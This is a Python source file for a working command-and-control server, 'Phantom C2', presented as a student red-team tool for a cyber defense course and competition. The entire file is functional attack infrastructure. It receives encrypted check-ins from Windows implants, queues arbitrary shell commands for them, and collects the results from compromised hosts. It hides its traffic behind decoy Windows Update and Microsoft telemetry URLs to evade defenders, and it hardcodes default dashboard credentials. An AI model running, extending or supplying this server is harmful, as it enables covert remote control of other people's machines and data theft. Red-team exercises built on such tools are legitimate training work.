#!/usr/bin/env python3
"""
Phantom C2 Server - Custom Command and Control Framework
Author: Koy Monette kfm9123@rit.edu
Course: CSEC-473 Cyber Defense Techniques
Purpose: Red Team infrastructure tool for competition use only

This C2 server manages Windows implants via HTTP/S with encrypted communications.
Designed for authorized competition use only.
"""

import os
import json
import time
import base64
import hashlib
import secrets
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template_string, request, jsonify, Response
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import threading

app = Flask(__name__)

# ============================================
# AUTHENTICATION CONFIGURATION
# ============================================
# Change these credentials for your competition!
DASHBOARD_USERNAME = 'redteam'
DASHBOARD_PASSWORD = 'Ph4nt0m!2026'  # Change this to something secure!

def check_auth(username, password):
    """Check if username/password combination is valid"""
    return username == DASHBOARD_USERNAME and password == DASHBOARD_PASSWORD

def authenticate():
    """Send 401 response that enables basic auth"""
    return Response(
        'Authentication required.\n'
        'Please provide valid credentials.', 401,
        {'WWW-Authenticate': 'Basic realm="Phantom C2 Dashboard"'})

def requires_auth(f):
    """Decorator to require authentication for dashboard routes"""
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# Global state management
beacons = {}  # Active beacons: {beacon_id: {info}}
commands = {}  # Pending commands: {beacon_id: [command_queue]}
results = {}   # Command results: {beacon_id: [results]}
beacon_lock = threading.Lock()

# ============================================
# CONFIGURATION
# ============================================
def load_or_generate_key():
    """Load existing key or generate new one"""
    key_file = 'server_key.bin'
    
    if os.path.exists(key_file):
        with open(key_file, 'rb') as f:
            key = f.read()
        print(f"[*] Loaded existing server key from {key_file}")
        return key
    else:
        key = secrets.token_bytes(32)
        with open(key_file, 'wb') as f:
            f.write(key)
        print(f"[*] Generated new server key, saved to {key_file}")
        return key

CONFIG = {
    'server_key': load_or_generate_key(),
    'beacon_timeout': 300,
    'max_results_per_beacon': 50
}

def aes_encrypt(data, key):
    """Encrypt data using AES-256-CBC"""
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Pad data to 16-byte boundary
    padding_length = 16 - (len(data) % 16)
    padded_data = data + (chr(padding_length) * padding_length).encode()
    
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext).decode()

def aes_decrypt(encrypted_data, key):
    """Decrypt AES-256-CBC encrypted data"""
    try:
        raw = base64.b64decode(encrypted_data)
        iv = raw[:16]
        ciphertext = raw[16:]
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        padding_length = padded_data[-1]
        return padded_data[:-padding_length].decode()
    except Exception as e:
        print(f"[!] Decryption error: {e}")
        return None

def generate_beacon_id(hostname, username):
    """Generate unique beacon ID from host info"""
    data = f"{hostname}_{username}_{time.time()}".encode()
    return hashlib.sha256(data).hexdigest()[:16]

def cleanup_dead_beacons():
    """Remove beacons that haven't checked in recently"""
    with beacon_lock:
        now = time.time()
        dead = [bid for bid, info in beacons.items() 
                if now - info['last_seen'] > CONFIG['beacon_timeout']]
        for bid in dead:
            print(f"[*] Beacon {bid} timed out")
            del beacons[bid]
            if bid in commands:
                del commands[bid]

# Background thread to cleanup dead beacons
def beacon_monitor():
    while True:
        time.sleep(60)
        cleanup_dead_beacons()

monitor_thread = threading.Thread(target=beacon_monitor, daemon=True)
monitor_thread.start()

# ============================================
# DASHBOARD ROUTES (Protected with Authentication)
# ============================================

@app.route('/')
@requires_auth
def index():
    """Main dashboard interface - PROTECTED"""
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/beacons')
@requires_auth
def api_beacons():
    """Get list of active beacons - PROTECTED"""
    with beacon_lock:
        beacon_list = []
        for bid, info in beacons.items():
            beacon_list.append({
                'id': bid,
                'hostname': info['hostname'],
                'username': info['username'],
                'os': info['os'],
                'ip': info['ip'],
                'first_seen': info['first_seen'],
                'last_seen': info['last_seen'],
                'checkin_count': info['checkin_count']
            })
        return jsonify(beacon_list)

@app.route('/api/command/<beacon_id>', methods=['POST'])
@requires_auth
def api_command(beacon_id):
    """Queue a command for a specific beacon - PROTECTED"""
    data = request.get_json()
    command = data.get('command', '')
    
    if not command:
        return jsonify({'error': 'No command provided'}), 400
    
    with beacon_lock:
        if beacon_id not in beacons:
            return jsonify({'error': 'Beacon not found'}), 404
        
        if beacon_id not in commands:
            commands[beacon_id] = []
        
        commands[beacon_id].append({
            'cmd': command,
            'timestamp': time.time(),
            'id': secrets.token_hex(8)
        })
        
        print(f"[+] Command queued for {beacon_id}: {command}")
        return jsonify({'success': True})

@app.route('/api/results/<beacon_id>')
@requires_auth
def api_results(beacon_id):
    """Get command results for a beacon - PROTECTED"""
    with beacon_lock:
        if beacon_id not in results:
            return jsonify([])
        return jsonify(results[beacon_id])

# ============================================
# BEACON ROUTES (No Authentication - beacons need access!)
# ============================================

@app.route('/windowsupdate/v6/reporting', methods=['POST'])
def beacon_checkin():
    """Handle beacon check-in (encrypted) - NO AUTH REQUIRED"""
    try:
        encrypted_data = request.data.decode()
        
        # Decrypt beacon data
        decrypted = aes_decrypt(encrypted_data, CONFIG['server_key'])
        if not decrypted:
            return "ERROR", 400
        
        data = json.loads(decrypted)
        
        # Extract beacon info
        hostname = data.get('hostname', 'unknown')
        username = data.get('username', 'unknown')
        os_info = data.get('os', 'unknown')
        ip_addr = request.remote_addr
        
        # Generate or retrieve beacon ID
        beacon_id = data.get('beacon_id')
        if not beacon_id:
            beacon_id = generate_beacon_id(hostname, username)
        
        # Update beacon state
        with beacon_lock:
            now = time.time()
            
            if beacon_id not in beacons:
                # New beacon registration
                beacons[beacon_id] = {
                    'hostname': hostname,
                    'username': username,
                    'os': os_info,
                    'ip': ip_addr,
                    'first_seen': now,
                    'last_seen': now,
                    'checkin_count': 1
                }
                print(f"[+] New beacon: {beacon_id} ({hostname}@{ip_addr})")
            else:
                # Existing beacon check-in
                beacons[beacon_id]['last_seen'] = now
                beacons[beacon_id]['checkin_count'] += 1
            
            # Handle command results if present
            if 'results' in data and data['results']:
                if beacon_id not in results:
                    results[beacon_id] = []
                
                results[beacon_id].extend(data['results'])
                
                # Limit stored results
                if len(results[beacon_id]) > CONFIG['max_results_per_beacon']:
                    results[beacon_id] = results[beacon_id][-CONFIG['max_results_per_beacon']:]
            
            # Get pending commands
            pending = commands.get(beacon_id, [])
            if pending:
                commands[beacon_id] = []  # Clear queue
            
            # Prepare response
            response_data = {
                'beacon_id': beacon_id,
                'commands': pending,
                'interval': 30 + secrets.randbelow(30)  # 30-60 second jitter
            }
        
        # Encrypt and send response
        encrypted_response = aes_encrypt(json.dumps(response_data).encode(), CONFIG['server_key'])
        return encrypted_response, 200
        
    except Exception as e:
        print(f"[!] Check-in error: {e}")
        return "ERROR", 500

# ============================================
# DECOY MICROSOFT ENDPOINTS (No Authentication)
# ============================================

@app.route('/windowsupdate/v6/status', methods=['GET'])
def windowsupdate_status():
    """Decoy endpoint - looks like Windows Update status check"""
    return jsonify({
        'status': 'ok',
        'lastCheck': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'),
        'updatesAvailable': 0
    })

@app.route('/msdownload/update/v3/static/trustedr/en/authrootstl.cab', methods=['GET'])
def ms_download():
    """Decoy endpoint - mimics Microsoft download server"""
    return "", 204

@app.route('/v10/ping', methods=['POST'])
def telemetry_ping():
    """Decoy endpoint - mimics Windows telemetry"""
    return jsonify({'status': 'received'})

# Web dashboard HTML (same as before, but now protected)
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Phantom C2 Dashboard</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff00;
            margin: 0;
            padding: 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 10px;
        }
        .header h1 {
            margin: 0;
            font-size: 2.5em;
            text-shadow: 0 0 10px #00ff00;
        }
        .auth-status {
            text-align: right;
            color: #888;
            font-size: 0.9em;
            margin-bottom: 10px;
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin-bottom: 20px;
        }
        .stat-box {
            background: #1a1a2e;
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
            min-width: 150px;
        }
        .stat-box .number {
            font-size: 2em;
            font-weight: bold;
        }
        .stat-box .label {
            font-size: 0.9em;
            color: #888;
        }
        .beacons-container {
            background: #1a1a2e;
            border: 1px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
        }
        .beacon-card {
            background: #0f1419;
            border-left: 4px solid #00ff00;
            padding: 15px;
            margin: 10px 0;
            cursor: pointer;
        }
        .beacon-card:hover {
            background: #1a2030;
        }
        .beacon-card.selected {
            border-left-color: #ff6b00;
            background: #2a2030;
        }
        .beacon-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .beacon-id {
            font-weight: bold;
            color: #00ff00;
        }
        .beacon-status {
            color: #888;
        }
        .command-panel {
            background: #1a1a2e;
            border: 1px solid #00ff00;
            padding: 20px;
        }
        input[type="text"] {
            width: 70%;
            background: #0f1419;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            font-family: 'Courier New', monospace;
        }
        button {
            background: #00ff00;
            color: #0a0e27;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            margin-left: 10px;
        }
        button:hover {
            background: #00cc00;
        }
        .results-container {
            background: #1a1a2e;
            border: 1px solid #00ff00;
            padding: 20px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        .result-item {
            background: #0f1419;
            padding: 10px;
            margin: 5px 0;
            border-left: 3px solid #888;
        }
        .result-cmd {
            color: #ff6b00;
            font-weight: bold;
        }
        .result-output {
            color: #00ff00;
            white-space: pre-wrap;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="auth-status">🔒 Authenticated Session</div>
    <div class="header">
        <h1>⚡ PHANTOM C2 ⚡</h1>
        <p>Command & Control Dashboard</p>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <div class="number" id="beacon-count">0</div>
            <div class="label">ACTIVE BEACONS</div>
        </div>
        <div class="stat-box">
            <div class="number" id="command-count">0</div>
            <div class="label">COMMANDS SENT</div>
        </div>
        <div class="stat-box">
            <div class="number" id="result-count">0</div>
            <div class="label">RESULTS RECEIVED</div>
        </div>
    </div>
    
    <div class="beacons-container">
        <h2>📡 Active Beacons</h2>
        <div id="beacons-list"></div>
    </div>
    
    <div class="command-panel">
        <h2>💻 Command Console</h2>
        <div id="selected-beacon">No beacon selected</div>
        <div style="margin-top: 15px;">
            <input type="text" id="command-input" placeholder="Enter command (e.g., whoami, ipconfig, dir)" disabled>
            <button onclick="sendCommand()" id="send-btn" disabled>EXECUTE</button>
        </div>
    </div>
    
    <div class="results-container">
        <h2>📋 Command Results</h2>
        <div id="results-list">No results yet</div>
    </div>
    
    <script>
        let selectedBeacon = null;
        let commandCount = 0;
        let resultCount = 0;
        
        function selectBeacon(beaconId) {
            selectedBeacon = beaconId;
            document.getElementById('command-input').disabled = false;
            document.getElementById('send-btn').disabled = false;
            document.getElementById('selected-beacon').textContent = 'Selected: ' + beaconId;
            
            document.querySelectorAll('.beacon-card').forEach(el => {
                el.classList.remove('selected');
            });
            document.getElementById('beacon-' + beaconId).classList.add('selected');
            
            loadResults(beaconId);
        }
        
        function sendCommand() {
            if (!selectedBeacon) return;
            
            const cmd = document.getElementById('command-input').value.trim();
            if (!cmd) return;
            
            fetch('/api/command/' + selectedBeacon, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: cmd})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    commandCount++;
                    document.getElementById('command-count').textContent = commandCount;
                    document.getElementById('command-input').value = '';
                    alert('Command queued!');
                }
            });
        }
        
        function loadResults(beaconId) {
            fetch('/api/results/' + beaconId)
                .then(r => r.json())
                .then(results => {
                    const container = document.getElementById('results-list');
                    if (results.length === 0) {
                        container.innerHTML = 'No results yet';
                        return;
                    }
                    
                    resultCount = results.length;
                    document.getElementById('result-count').textContent = resultCount;
                    
                    container.innerHTML = results.map(r => `
                        <div class="result-item">
                            <div class="result-cmd">$ ${r.cmd}</div>
                            <div class="result-output">${r.output}</div>
                        </div>
                    `).reverse().join('');
                });
        }
        
        function updateBeacons() {
            fetch('/api/beacons')
                .then(r => r.json())
                .then(beacons => {
                    document.getElementById('beacon-count').textContent = beacons.length;
                    
                    const container = document.getElementById('beacons-list');
                    if (beacons.length === 0) {
                        container.innerHTML = '<p>No active beacons</p>';
                        return;
                    }
                    
                    container.innerHTML = beacons.map(b => {
                        const lastSeen = new Date(b.last_seen * 1000).toLocaleString();
                        return `
                            <div class="beacon-card" id="beacon-${b.id}" onclick="selectBeacon('${b.id}')">
                                <div class="beacon-header">
                                    <span class="beacon-id">${b.hostname} (${b.username})</span>
                                    <span class="beacon-status">Last seen: ${lastSeen}</span>
                                </div>
                                <div style="color: #888;">
                                    ID: ${b.id} | IP: ${b.ip} | OS: ${b.os} | Check-ins: ${b.checkin_count}
                                </div>
                            </div>
                        `;
                    }).join('');
                });
        }
        
        setInterval(updateBeacons, 2000);
        setInterval(() => {
            if (selectedBeacon) loadResults(selectedBeacon);
        }, 3000);
        
        updateBeacons();
        
        document.getElementById('command-input').addEventListener('keypress', e => {
            if (e.key === 'Enter') sendCommand();
        });
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    print("""
╔═══════════════════════════════════════════════════════════╗
║           PHANTOM C2 SERVER - STARTING UP                 ║
║  Authorized CCDC Competition Use Only                     ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Display encryption key
    key_hex = CONFIG['server_key'].hex()
    print(f"[*] Server Key (hex): {key_hex}")
    print(f"[*] Save this key for implant configuration!")
    
    # Display dashboard credentials
    print(f"\n[*] Dashboard Authentication:")
    print(f"    Username: {DASHBOARD_USERNAME}")
    print(f"    Password: {DASHBOARD_PASSWORD}")
    print(f"    ⚠️  CHANGE THESE CREDENTIALS in c2_server.py before deployment!")
    
    print(f"\n[*] Starting server on http://0.0.0.0:8080")
    print(f"[*] Dashboard: http://localhost:8080")
    print()
    
    # Save key to file
    with open('server_key.txt', 'w') as f:
        f.write(key_hex)
    print("[*] Key saved to server_key.txt")
    
    app.run(host='0.0.0.0', port=8080, debug=False)
